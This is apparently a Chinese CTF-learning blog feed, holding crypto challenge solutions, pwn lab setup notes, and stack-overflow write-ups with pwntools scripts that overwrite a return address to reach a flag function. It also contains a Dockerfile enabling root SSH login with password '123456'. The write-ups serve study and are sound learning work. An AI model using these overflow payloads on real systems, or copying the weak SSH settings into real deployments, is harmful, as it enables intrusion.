    
    <entry>
      <title>eg1</title>
      <link href="/2025/06/c6778b7d8e59.html"/>
      <url>/2025/06/c6778b7d8e59.html</url>
      
        <content type="html"><![CDATA[<p>WGRMcdt{Rxqtsdgncdghxqz}<br>a&#x3D;7,b&#x3D;3<br><img src="/images/FE5A1AA8-8C8C-4C9E-9A01-0878584AC108.png"><br>TZCFlag{Congratulations}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 仿射密码(Affine Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e,c</title>
      <link href="/2025/06/34720d94c3a3.html"/>
      <url>/2025/06/34720d94c3a3.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 3487583947589437589237958723892346254777<br>q &#x3D; 8767867843568934765983476584376578389<br>e &#x3D; 65537<br>cipher &#x3D; 26369494845903294944045520286034018329014599704760363106090278637665342700044</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from sympy import mod_inverse</span><br><span class="line">e = 65537</span><br><span class="line">p = 3487583947589437589237958723892346254777</span><br><span class="line">q = 8767867843568934765983476584376578389</span><br><span class="line">cipher = 26369494845903294944045520286034018329014599704760363106090278637665342700044</span><br><span class="line"></span><br><span class="line">n = p * q #计算模数</span><br><span class="line">phi_n = (p - 1) * (q - 1) #计算欧拉函数</span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi_n) #计算私钥d=e^-1 mod ϕ(n)</span><br><span class="line"></span><br><span class="line">m = pow(cipher, d, n) #m=cipher^d mod n使用 pow 函数进行模幂运算，效率更高</span><br><span class="line"></span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    # 将数字转换为字节流</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    # 将字节流转换为 ASCII 字符串</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{try_rsa}<br><img src="/images/Pastedimage20250603143947.png">）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Url编码</title>
      <link href="/2025/06/fd640f926f7d.html"/>
      <url>/2025/06/fd640f926f7d.html</url>
      
        <content type="html"><![CDATA[<p>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d<br>flag{and 1&#x3D;1}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变异凯撒</title>
      <link href="/2025/06/ecdefcda6b13.html"/>
      <url>/2025/06/ecdefcda6b13.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601180351.png"><br><img src="/images/Pastedimage20250601180858.png"><br>ASCII码值<br>f–&gt;102<br>l–&gt;108<br>a–&gt;97<br>g–&gt;103<br><img src="/images/Pastedimage20250601180916.png"><br>每对一位字母进行加密，偏移量依次增加1<br>编写Python代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">txt=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span><br><span class="line">start=5</span><br><span class="line">for i in txt:</span><br><span class="line">    print(chr(ord(i)+start),end=&#x27;&#x27;)</span><br><span class="line">    start+=1</span><br></pre></td></tr></table></figure><p>flag{Caesar_variation}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>看我回旋踢</title>
      <link href="/2025/06/03b0b68e120a.html"/>
      <url>/2025/06/03b0b68e120a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601021138.png"><br>观察这串密文，我们可以发现开头正好四个字母，并且跟着个括号，这和flag｛｝非常相像，而且题目给我们提示“回旋” 由此我们可以推断出synt是flag经过移位后得到的，这就是凯撒密码。凯撒密码首先选定一个移位数n，比如n&#x3D;3，那么a经过加密后就是d。所以我们在这道题中应该先推测出移位数，s-&gt;f数13次后便得到f，因此移位数就是13，我们可以从网上找到转换器得到结果</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apt源</title>
      <link href="/2025/06/b3faf4611dc8.html"/>
      <url>/2025/06/b3faf4611dc8.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2025/06/d2e0ca152f6f.html"/>
      <url>/2025/06/d2e0ca152f6f.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">#  32 </span></span><br><span class="line">RUN dpkg --add-architecture i386 &amp;&amp; apt-get -y update</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    vim \</span><br><span class="line">    nano \</span><br><span class="line">    git \</span><br><span class="line">    curl \</span><br><span class="line">    wget \</span><br><span class="line">    <span class="built_in">sudo</span> \</span><br><span class="line">    netcat-openbsd \</span><br><span class="line">    openssh-server \</span><br><span class="line">    unzip \</span><br><span class="line">    bison \</span><br><span class="line">    flex</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    python3 \</span><br><span class="line">    python3-pip \</span><br><span class="line">    python3-venv \</span><br><span class="line">    python3-dev \</span><br><span class="line">    python3-setuptools</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    libglib2.0-dev \</span><br><span class="line">    libfdt-dev \</span><br><span class="line">    libpixman-1-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    gcc-multilib \</span><br><span class="line">    gdb \</span><br><span class="line">    gdb-multiarch \</span><br><span class="line">    clang \</span><br><span class="line">    lldb \</span><br><span class="line">    make \</span><br><span class="line">    cmake</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    qemu-system-x86 \</span><br><span class="line">    qemu-user \</span><br><span class="line">    qemu-user-binfmt \</span><br><span class="line">    tmux \</span><br><span class="line">    konsole</span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    lib32z1 \</span><br><span class="line">    libc6-dbg \</span><br><span class="line">    libc6-dbg:i386 \</span><br><span class="line">    libgcc-s1:i386</span><br><span class="line"><span class="comment"># enable ssh login</span></span><br><span class="line">RUN <span class="built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="line">RUN sed -ri <span class="string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="line">    sed -ri <span class="string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable login with password</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># defaultly we have a user `ubuntu` in the image</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;ubuntu:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;root:123456&quot;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># add sudo</span></span><br><span class="line">RUN usermod -aG <span class="built_in">sudo</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable ssh key login</span></span><br><span class="line"><span class="comment">#RUN mkdir /home/ubuntu/.ssh &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    echo &quot;Your ssh key&quot; &gt; /home/ubuntu/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># keep container running</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /root/start.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># create venv for pip</span></span><br><span class="line">RUN python3 -m venv /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">chown</span> -R ubuntu:ubuntu /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;\n\n# pip venv\nsource /pip_venv/bin/activate&quot;</span> &gt;&gt; /home/ubuntu/.bashrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn-related tools</span></span><br><span class="line">RUN /pip_venv/bin/pip config <span class="built_in">set</span> global.index-url https://pypi.org/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config <span class="built_in">set</span> global.trusted-host pypi.org &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 -U pip &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 --no-cache-dir \</span><br><span class="line">    pwntools \</span><br><span class="line">    ropgadget \</span><br><span class="line">    z3-solver \</span><br><span class="line">    smmap2 \</span><br><span class="line">    apscheduler \</span><br><span class="line">    ropper \</span><br><span class="line">    unicorn \</span><br><span class="line">    keystone-engine \</span><br><span class="line">    capstone \</span><br><span class="line">    angr \</span><br><span class="line">    pebble \</span><br><span class="line">    r2pipe \</span><br><span class="line">    LibcSearcher \</span><br><span class="line">    poetry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">RUN git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">    <span class="built_in">cd</span> pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/root/start.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 22</span><br></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t pwnenv_ubuntu24 .</span><br><span class="line">docker run -d \ -p 25000:22 \ --name=pwn24 \ --cap-add=SYS_PTRACE \ -v ~/Desktop/CTF:/CTF \ pwnenv_ubuntu24</span><br><span class="line">docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 bash   #进入容器</span><br></pre></td></tr></table></figure><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:22</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn24</code>： 容器名为 <code>pwn24</code></li><li><code>--cap-add=SYS_PTRACE</code>：添加 <code>SYS_PTRACE</code> 权限，允许调试和追踪进程</li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu24</code>：创建容器所使用的镜像</li></ul><p><strong>启动问题：打开还是gdb 而不是pwngdb</strong><br><img src="/images/Pastedimage20250612160927.png"><br><img src="/images/Pastedimage20250612161114.png"><br><img src="/images/Pastedimage20250612161139.png"><br><img src="/images/D339EED4-6AF8-4063-858A-B1FA023C41141.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;pwndbg&quot;</span> 2&gt;/dev/null <span class="comment"># 查找 pwndbg 目录</span></span><br><span class="line"><span class="built_in">cd</span> /pwndbg</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> -R ubuntu:ubuntu /pwndbg <span class="comment">#赋予目录权限</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>以后启动：<br><code>sudo docker start pwn24 #启动容器</code>                                                                                                                                                                                            </p><p><code>sudo docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 /bin/bash  #进入容器</code></p><p>退出虚拟环境：deactivate           exit</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 分析环境搭建 </category>
          
          <category> Docker搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置静态ip</title>
      <link href="/2025/06/22aa1a4e235e.html"/>
      <url>/2025/06/22aa1a4e235e.html</url>
      
        <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#x72;&#x68;&#101;&#x61;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#52;&#50;&#46;&#x31;&#51;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭自动更新</title>
      <link href="/2025/06/14fc120b64fb.html"/>
      <url>/2025/06/14fc120b64fb.html</url>
      
        <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gets</title>
      <link href="/2025/06/fcd2b1c02c8b.html"/>
      <url>/2025/06/fcd2b1c02c8b.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/4CFEA279-2137-4C60-9C95-DDC38ED31AC11.png"><br>32位仅部分开启RELRO保护<br><img src="/images/F054FEF7-B882-4776-BCDB-686A78907E921.png"><br><img src="/images/5134CF56-EB95-448F-9D0C-96C479650816.png"><br><img src="/images/Pastedimage20250605152104.png"><br>栈布局：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ s[36] ] [ ebp ] [ 返回地址 ]</span><br></pre></td></tr></table></figure><p>声明了一个长度为 36 字节的字符数组 s，调用 gets 函数，并将 s 数组作为参数传递给它，然后将 gets 函数的返回值作为 ctfshow 函数的返回值。</p><p>这里是 28h，也就是 0x28，对于 32 位程序，我们 payload 还需要加 4 。<br>（根据程序是 32 位还是 64 位，对应加上 4 或 8 个字节的 ebp（栈底））<br><img src="/images/Pastedimage20250605144435.png"><br>漏洞在于 <code>printf(s)</code> 直接使用文件内容作为格式字符串，这会导致：</p><ol><li>如果文件内容包含格式化字符（如 <code>%x</code>, <code>%p</code>, <code>%s</code>），会泄露栈内存</li><li>可能造成内存崩溃（如使用 <code>%n</code> 写入内存）<br>右键Text view<br><img src="/images/Pastedimage20250605150355.png"><br>知道get_flag函数的地址在0x08048586</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)  <span class="comment">#本地连接</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;10.190.131.17&#x27;,51286) #远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>) </span><br><span class="line"><span class="comment"># get_flag=elf.sym[&#x27;get_flag&#x27;] #查找get_flag函数的地址</span></span><br><span class="line">get_flag_addr = <span class="number">0x08048586</span> <span class="comment">#get_flag 函数地址 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#构造栈溢出 payload </span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(<span class="number">0x8048586</span>) <span class="comment"># 覆盖返回地址为 get_flag，32位程序用 p32</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload) <span class="comment">#发送 payload</span></span><br><span class="line">p.interactive() <span class="comment">#交互获取 flag 输出 </span></span><br></pre></td></tr></table></figure><p><img src="/images/6BDB377B-73EA-4D11-9676-CA8F8310F6CE.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>overflower</title>
      <link href="/2025/06/48c6d2cc3611.html"/>
      <url>/2025/06/48c6d2cc3611.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/705048A9-C62E-4272-B122-5AF2FADA48EF.png"><br><img src="/images/Pastedimage20250615160603.png"><br><img src="/images/Pastedimage20250615160614.png"><br><img src="/images/Pastedimage20250615160623.png"><br><img src="/images/Pastedimage20250615160632.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; &#x27;</span>,端口号)  </span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x401146</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> +p64(<span class="number">0x40115B</span>) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250615160703.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/06/c0e0ed6e703e.html"/>
      <url>/2025/06/c0e0ed6e703e.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>替换图片路径</p><ol><li><strong>搜索</strong>：<code>!\[(.*?)\]\((.*?)\.(png|jpg|jpeg|gif|webp)\)</code><br> （匹配 Markdown 图片语法：<code>![描述](images/路径.png)</code>）</li><li><strong>替换</strong>：<code>![$1](/images/$2.$3)</code><br> （将路径部分替换为 <code>/images/</code> 开头）</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Rhea的个人博客搭建教程</title>
      <link href="/2025/06/11915e8c8095.html"/>
      <url>/2025/06/11915e8c8095.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250612191927.png"></p><ul><li>public 最终所见网页的所有内容</li><li>node_modules 插件以及hexo所需node.js模块</li><li>_config.yml 站点配置文件，设定一些公开信息等</li><li>package.json 应用程序信息，配置hexo运行所需js包</li><li>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容</li><li>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）</li><li>source 用于存放用户资源（除 <em>posts 文件夹，其余命名方式为 “</em> + 文件名”的文件被忽略）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s# 开启本地预览服务</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250612192246.png"></p><p><img src="/images/b8166acda25c9e43f82211f2033095c.png">git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly<br><strong>操作步骤</strong>：<br>① 新建自定义 CSS：在 <code>themes/butterfly/source/css/</code> 目录创建 <code>transparency.css</code>，写入透明样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页面背景透明 */</span> </span><br><span class="line"><span class="selector-id">#web_bg</span> &#123; <span class="attribute">opacity</span>: <span class="number">0.8</span>; <span class="comment">/* 若主题已设置背景图，可叠加透明：background: rgba(255,255,255,0.8); */</span> &#125; <span class="comment">/* 卡片（文章、侧边栏）透明 */</span> <span class="selector-class">.card-widget</span>, <span class="selector-class">.post-content</span> &#123; <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="meta">!important</span>; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/denjones/hexo-theme-chan.git">https://github.com/denjones/hexo-theme-chan.git</a><br><img src="/images/Pastedimage20250612205412.png"><br><img src="/images/Pastedimage20250612205824.png"></p><h2 id="二级标题1"><a href="#二级标题1" class="headerlink" title="二级标题1"></a>二级标题1</h2><p>“Live loud, leave a mark.”<br>“Walk alone, walk tall.”</p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>替换图片markdown格式<br>Ctrl + Shift + F<br>Ctrl + Shift + H</p><ul><li>上方：搜索内容（ <code>!\[\[(.*?)\]\]</code>）</li><li>下方：替换内容（<code>![](/assets/images/$1)</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> hexo-blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图</title>
      <link href="/2025/06/c3f31b69c914.html"/>
      <url>/2025/06/c3f31b69c914.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-最小生成树概念"><a href="#1-最小生成树概念" class="headerlink" title="1. 最小生成树概念"></a>1. 最小生成树概念</h3><p>生成树概念：</p><blockquote><p><strong>无向图中</strong>，一个<strong>连通图</strong>的最小连通子图称作该图的生成树（不能带环，保持连通，但边要尽可能的少）。<br>有n个顶点的连通图的生成树有n个顶点和<strong>n-1条边</strong>。<br>比如：<br><img src="/images/https:/i-blog.csdnimg.cn/blog_migrate/9d864e26aa58c0192ce2318935b1caa1.png" alt="在这里插入图片描述"></p></blockquote><p>这里的最小其实是指的边的<strong>权值之和最小</strong>，当然是要在保证它是生成树的前提下权值之和最小。<br>所以，对于一个连通图来说，在它的所有的生成树里面，边的权值之和最小的生成树就是该连通图的最小生成树，当然最小生成树也可以有多个，因为边的权值是可以相等的。</p><p>连通图中的每一棵生成树，都是原图的一个<strong>极大无环子图</strong>，即：<strong>从其中删去任何一条边，生成树就不再连通；反之，在其中引入任何一条新边，都会形成一条回路。</strong></p><p>若连通图由n个顶点组成，<strong>&#x3D;&#x3D;则其生成树必含n个顶点和n-1条边&#x3D;&#x3D;</strong>。因此构造最小生成树的准则有三条：</p><ol><li>只能使用图中权值最小的边来构造最小生成树</li><li>只能使用恰好n-1条边来连接图中的n个顶点</li><li>选用的n-1条边不能构成回路</li></ol><p>构造最小生成树的方法：<br>Kruskal算法和Prim算法。<br>这两个算法都采用了逐步求解的贪心策略。</p><p>贪心算法：<br>是指在问题求解时，总是做出当前看起来最好的选择。<br>也就是说贪心算法做出的不是整体最优的的选择，而是某种意义上的局部最优解。<br><strong>贪心算法不是对所有的问题都能得到整体最优解。</strong></p><h3 id="Prim算法（普里姆）"><a href="#Prim算法（普里姆）" class="headerlink" 